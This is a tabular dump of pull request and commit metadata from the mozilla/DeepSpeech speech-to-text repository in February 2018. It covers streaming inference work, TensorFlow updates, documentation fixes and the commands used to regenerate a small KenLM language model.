3239,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1277,1277,fixed outdated README,,chuckcho,13352012,2018-02-28T23:44:21Z,NONE,False,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,adacafeb4756a93b1c7fd95a72dc2f66d7be9a95,fixed outdated README
3240,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,70cc9945c9b96d8604214dcd87a979dc729720ab,Streaming inference
3241,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7f84c67cd8b4fecb0aad461b7f07b1eddd9c0856,Add tool to find out which ops are needed by a graph
3242,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d9a15505434f08e9d7877eec38421c31e2213993,Update native_client/BUILD comment about binary sizes
3243,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,17bdffe3410cc8d5b44cbab9139c0ddccf2c5f02,Add tool to convert graph protobuf to pbtxt
3244,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,05ae19bf6e4c43f048647523f22ed991cb7d17e2,Add evaluate.py script to create a WER report from a checkpoint using the inference graph
3245,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f84ce5135d6255b8db7a2b82c5867020b0a58946,Increase CI training epochs to guarantee overfitting
3246,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,92a0019e605ecdd76bf7c10688b53230e215ecb9,Convert native API to C instead of C++
3247,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c06ad6dc7cc8c95c37625cdf35e29debe3337642,Remove some deepspeech_utils references that crept up during rebase
3248,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,19bb31b02776173af08f7ae46c3c5dbd306a27fd,Infer n_steps and n_context from model file
3249,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b1c858bbffac7bcf701d1ff3ed1586184bfde010,Switch to LSTMBlockFusedCell
3250,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2d1e275d92ddae83bba5e930b4f209c809c3df32,Don't handle dropout rates as Python values
3251,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,165e47ce997fac7b60673f243d0a1bbe36f57ccb,Add intermediateDecode method to the API
3252,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,79a6c9e4fa63f94cdbbbf87d93e3c86b64e5997c,Finalize training graph before starting training
3253,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,949b6ae1c70e5abd699496b95e85a28aab04c499,Disable AOT tasks
3254,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e0b08ce80c02722feacec3d6e1c342534537ab9,Remove word count bonus in favor of length normalization
3255,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f7e608f6ea1a07efbea1c83b8091c9643cab21d3,Architecture changes from training
3256,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c8523d94c51b575460c27c700b8f209cd226465,Switch to updated head in TensorFlow r1.6 branch
3257,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1275,1275,Streaming inference,"This is the WIP of streaming inference support. We need to decide on a unidirectional architecture to use before we can merge this PR. Some pending stuff is better documentation of the streaming implementation, and actually testing the AOT model code paths.

At this point I'd appreciate a review of the API changes in deepspeech.h (see the clients and DeepSpeech::Model::stt for example usage).",reuben,477142,2018-02-28T15:24:38Z,MEMBER,False,1765,1372,73,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7b873365f8bfffe2ea84dcd34058b537e9095765,Switch prod model to a streaming based one
3258,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1270,1270,Fix positional arguments in README.md,The updated command has the positional arguments in the correct order to make inference work out of the box after getting the pre-trained model.,nilakshdas,1882688,2018-02-25T17:51:22Z,NONE,False,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3a9857d091979dce1a4a7e1d36ff5a28b65d5967,"Fix positional arguments in README.md

The updated command has the positional arguments in the correct order to make inference work out of the box after getting the pre-trained model."
3259,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1264,1264,Update ccpp,,lissyx,1645737,2018-02-20T16:33:35Z,COLLABORATOR,True,28,27,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce80a094bac6e909a28a34b78a063ed311c470a0,"Fix doc with no --config=monolithic for libctc_decoder_with_kenlm.so

Fixes #1260
X-DeepSpeech: NOBUILD"
3260,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1264,1264,Update ccpp,,lissyx,1645737,2018-02-20T16:33:35Z,COLLABORATOR,True,28,27,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,93393ddca3775f3f03a5c2d637e1824ac37cfec9,"Merge pull request #1261 from lissyx/doc-decoder

Fix doc with no --config=monolithic for libctc_decoder_with_kenlm.so
X-DeepSpeech: NOBUILD"
3261,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1264,1264,Update ccpp,,lissyx,1645737,2018-02-20T16:33:35Z,COLLABORATOR,True,28,27,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc3b28291d433fd65f0db1635e290bef3f02e77d,Merge remote-tracking branch 'upstream/master' into update-ccpp
3262,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1264,1264,Update ccpp,,lissyx,1645737,2018-02-20T16:33:35Z,COLLABORATOR,True,28,27,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,04ebefa1ad36fd8717175a2fea7d403d0ecab527,Update TF CCPP
3263,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1263,1263,Update tf master,,lissyx,1645737,2018-02-20T16:33:21Z,COLLABORATOR,True,26,25,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce80a094bac6e909a28a34b78a063ed311c470a0,"Fix doc with no --config=monolithic for libctc_decoder_with_kenlm.so

Fixes #1260
X-DeepSpeech: NOBUILD"
3264,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1263,1263,Update tf master,,lissyx,1645737,2018-02-20T16:33:21Z,COLLABORATOR,True,26,25,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,93393ddca3775f3f03a5c2d637e1824ac37cfec9,"Merge pull request #1261 from lissyx/doc-decoder

Fix doc with no --config=monolithic for libctc_decoder_with_kenlm.so
X-DeepSpeech: NOBUILD"
3265,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1263,1263,Update tf master,,lissyx,1645737,2018-02-20T16:33:21Z,COLLABORATOR,True,26,25,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f2306bef1806fa1df3475a7b2aa53e77767dea3,Merge remote-tracking branch 'upstream/master' into update-tf-master
3266,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1263,1263,Update tf master,,lissyx,1645737,2018-02-20T16:33:21Z,COLLABORATOR,True,26,25,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c07e3470ba8eaff61ea0f4ec0b5a9a772e57b2a2,Update TF
3267,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1261,1261,Fix doc with no --config=monolithic for libctc_decoder_with_kenlm.so,"Fixes #1260
X-DeepSpeech: NOBUILD",lissyx,1645737,2018-02-20T10:16:20Z,COLLABORATOR,True,5,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce80a094bac6e909a28a34b78a063ed311c470a0,"Fix doc with no --config=monolithic for libctc_decoder_with_kenlm.so

Fixes #1260
X-DeepSpeech: NOBUILD"
3268,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1256,1256,Ccpp new,,lissyx,1645737,2018-02-16T18:20:58Z,COLLABORATOR,True,95,28,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0c30a6d7ee5bec67a406647d46552ae5d26c23c1,WIP: Linux/AMD64/OpenCL+CCPP builds
3269,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1255,1255,Sync master,,lissyx,1645737,2018-02-16T10:20:04Z,COLLABORATOR,True,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,52adc2b2ddfb70eebfea84ada44f74af29336f2b,Force re-build
3270,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1255,1255,Sync master,,lissyx,1645737,2018-02-16T10:20:04Z,COLLABORATOR,True,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1342dc8fb7a43911e1a6bce52b38e8ef800acce2,Merge remote-tracking branch 'upstream/master' into sync-master
3271,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1255,1255,Sync master,,lissyx,1645737,2018-02-16T10:20:04Z,COLLABORATOR,True,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f0372af50c2882c0fafdb9d4b94ff794e45368b4,Use proper convert_graphdef tool from master
3272,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1255,1255,Sync master,,lissyx,1645737,2018-02-16T10:20:04Z,COLLABORATOR,True,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8ee1e9eea707fd2db65930f4093dec9fe8f90760,Update deps to 1.6.0-rc1
3273,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1255,1255,Sync master,,lissyx,1645737,2018-02-16T10:20:04Z,COLLABORATOR,True,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7de465b2b7f4f0e2e21efa332954f20086aeed1e,Switch to new TensorFlow master
3274,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cee1ec0f17964d6a1138c2bbcfe7a075a34ca220,Remove deprecated session_bundle usage and clean up export code
3275,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,983e13f218803bd1c37536073c41c3a435616525,Remove TF 1.0 compatibility hack
3276,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32c06acdf86baf31a92621c602ea9a8fd0d4a0b5,"Merge pull request #1229 from mozilla/export-cleanup

Clean up export code and remove some TF 1.0 compat code (Fixes #1228)"
3277,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f54b1f6ad83690b3b321bb6b45a41d0cbf6cbe66,"Multiple audio native_client benchmark

Fixes #1232"
3278,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd8d463dc171efaea4bfce6e70584dabe94e2a5c,"Merge pull request #1234 from lissyx/nc-multi

Multiple audio native_client benchmark"
3279,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0c323e8c6726bcd0b7e97474e2dacd30bcf1b78e,"Support MemmappedFileSystem

Fixes #1231"
3280,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,23c8dcffcf9337c394301d2756976b234729cc9b,"Merge pull request #1235 from lissyx/memmapped

Support MemmappedFileSystem"
3281,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48fbf864122a23b772f37ffcbdec6fbfa4374289,Merge remote-tracking branch 'upstream/master' into update-tf-master
3282,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d7653d749b68a8a487e161f87cbc8c2f0c23eedd,"Use LDC93S1 small language model

How to regenerate:
 - Get a KenLM build
 - $ (tr -d '[:digit:]|[:punct:]' < LDC93S1.txt | tr '[:upper:]' '[:lower:]'; head -n 500 ../lm/vocab.txt) > vocab.txt
 - $ bin/lmplz --prune 0 0 1 --order 5 --text vocab.txt --arpa vocab.pruned.arpa
 - $ bin/build_binary  -s vocab.pruned.arpa vocab.pruned.lm
 - $ generate_trie ../alphabet.txt vocab.pruned.lm vocab.txt vocab.trie

Fixes #1245"
3283,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d58ad709a7761c3afdc61ffe942a1f43fb567a18,"Merge pull request #1247 from lissyx/remove-gitlfs

Use LDC93S1 small language model"
3284,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e4773028ba915ec9481a9ec6a3b3b978c8a1c074,"Update doc for mmap-able model

Fixes #1248"
3285,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,24e6b0f584306d051c1a619146dc1da2d5507403,Merge remote-tracking branch 'upstream/master' into update-tf-master
3286,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7404cdde280aa57955651d5086e79de821b8f3fe,"Merge pull request #1249 from lissyx/doc-mmap

Update doc for mmap-able model"
3287,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,62034f7bf6b58f8028fc468b9d9cc4a15efee0e3,"Switch to use Amazon EC2 mirrors

Fixes #1250"
3288,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1252,1252,Update tf master,,lissyx,1645737,2018-02-15T16:49:46Z,COLLABORATOR,True,248813,152,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,60ef348587a3f3c4b28cf8f23685ed5dd77e5090,Merge remote-tracking branch 'upstream/master' into update-tf-master
3289,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1251,1251,Apt mirrors,,lissyx,1645737,2018-02-15T15:10:25Z,COLLABORATOR,True,3,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4fa424dc8bbfaddc2bdc15dcb9a85810437d734c,"Switch to use Amazon EC2 mirrors

Fixes #1250"
3290,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1249,1249,Update doc for mmap-able model,"Fixes #1248
X-DeepSpeech: NOBUILD",lissyx,1645737,2018-02-15T14:35:43Z,COLLABORATOR,True,18,5,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e4773028ba915ec9481a9ec6a3b3b978c8a1c074,"Update doc for mmap-able model

Fixes #1248"
3291,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1247,1247,Use LDC93S1 small language model,"How to regenerate:
```
 - Get a KenLM build
 - $ (tr -d '[:digit:]|[:punct:]' < LDC93S1.txt | tr '[:upper:]' '[:lower:]'; head -n 500 ../lm/vocab.txt) > vocab.txt
 - $ bin/lmplz --prune 0 0 1 --order 5 --text vocab.txt --arpa vocab.pruned.arpa
 - $ bin/build_binary  -s vocab.pruned.arpa vocab.pruned.lm
 - $ generate_trie ../alphabet.txt vocab.pruned.lm vocab.txt vocab.trie
```

Fixes #1245",lissyx,1645737,2018-02-15T12:57:01Z,COLLABORATOR,True,248534,21,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d7653d749b68a8a487e161f87cbc8c2f0c23eedd,"Use LDC93S1 small language model

How to regenerate:
 - Get a KenLM build
 - $ (tr -d '[:digit:]|[:punct:]' < LDC93S1.txt | tr '[:upper:]' '[:lower:]'; head -n 500 ../lm/vocab.txt) > vocab.txt
 - $ bin/lmplz --prune 0 0 1 --order 5 --text vocab.txt --arpa vocab.pruned.arpa
 - $ bin/build_binary  -s vocab.pruned.arpa vocab.pruned.lm
 - $ generate_trie ../alphabet.txt vocab.pruned.lm vocab.txt vocab.trie

Fixes #1245"
3292,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1235,1235,Support MemmappedFileSystem,Fixes #1231,lissyx,1645737,2018-02-14T17:47:41Z,COLLABORATOR,True,106,41,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0c323e8c6726bcd0b7e97474e2dacd30bcf1b78e,"Support MemmappedFileSystem

Fixes #1231"
3293,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1234,1234,Multiple audio native_client benchmark,Fixes #1232,lissyx,1645737,2018-02-14T16:10:52Z,COLLABORATOR,True,133,43,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f54b1f6ad83690b3b321bb6b45a41d0cbf6cbe66,"Multiple audio native_client benchmark

Fixes #1232"
3294,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1230,1230,Update tf master,,lissyx,1645737,2018-02-14T14:58:31Z,COLLABORATOR,True,35,33,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eac987a09c4fea31f0d5bb54fa1c83ee5a00a6e7,Switch to reference TensorFlow r1.4 branch
3295,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1230,1230,Update tf master,,lissyx,1645737,2018-02-14T14:58:31Z,COLLABORATOR,True,35,33,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a7415adb0bec78bf3dfb8797933ec436c62514dc,"Merge pull request #1221 from lissyx/switch-r1.4-branch

Switch to reference TensorFlow r1.4 branch"
